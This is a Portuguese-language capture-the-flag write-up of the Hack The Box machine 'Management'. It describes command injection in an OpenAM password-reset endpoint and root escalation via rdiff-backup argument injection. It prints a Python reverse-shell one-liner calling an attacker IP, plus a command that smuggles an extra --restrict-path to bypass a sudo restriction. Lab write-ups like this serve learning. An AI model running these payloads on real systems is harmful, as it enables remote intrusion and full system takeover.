Markdown

# Management — Hack The Box (Medium)

Write-up da máquina **Management** do Hack The Box, cobrindo o vetor de acesso inicial via RCE em aplicação OpenAM e escalação de privilégio através de injeção de argumentos no `rdiff-backup`.

---

## 🛠️ Resumo da Máquina

* **SO:** Linux
* **Dificuldade:** Easy
* **Vetor Web:** Command Injection no ForgeRock OpenAM (`/openam/ui/PWResetUserValidation`)
* **Vetor Root:** Escalation via `sudo` com `rdiff-backup` (Bypass do `--restrict-path`)

---

## 1. Reconhecimento e Enumeração

A varredura de portas e subdomínios revelou dois serviços principais expostos:
* `sso.management.htb`: Instância do gerenciador de identidade ForgeRock OpenAM.
* `management.htb`: Painel de gerenciamento de TI (GLPI).

A análise focou-se no subdomínio `sso.management.htb`, especificamente nas rotas de validação de usuários e redefinição de senha (`/openam/ui/PWResetUserValidation`).

---

## 2. Acesso Inicial (Initial Access)

O endpoint de redefinição de senhas do OpenAM apresentava tratamento inadequado de entradas no parâmetro de validação, permitindo a execução arbitrária de comandos no sistema operacional.

### Proof of Concept (PoC)

Foi utilizado um script customizado para enviar a requisição HTTP contendo o payload de *reverse shell* em Python:

```bash
python3 exploit.py --url [https://sso.management.htb/openam/ui/PWResetUserValidation](https://sso.management.htb/openam/ui/PWResetUserValidation) "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.17.83\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"

Após o disparo, obtivemos a conexão reversa sob o contexto da conta do serviço da aplicação e resgatamos a flag user.txt.
3. Escalação de Privilégio (Privilege Escalation)

Inspecionando os privilégios do usuário via sudo -l, identificou-se a seguinte permissão:
Plaintext

User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *

Exploração da vulnerabilidade no rdiff-backup

A regra do sudo limitava a execução do rdiff-backup ao diretório /opt/backup via --restrict-path.

Contudo, a arquitetura cliente-servidor do rdiff-backup utiliza o placeholder %s no argumento --remote-schema para substituir o nome do host indicado no destino (/::/root). Ao passar / como hostname, o cliente injeta um segundo parâmetro --restrict-path / no comando executado pelo sudo, sobrescrevendo a restrição anterior de /opt/backup.
Execução do Payload Root
Bash

rdiff-backup \
  --remote-schema "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s" \
  backup /::/root /tmp/root_backup
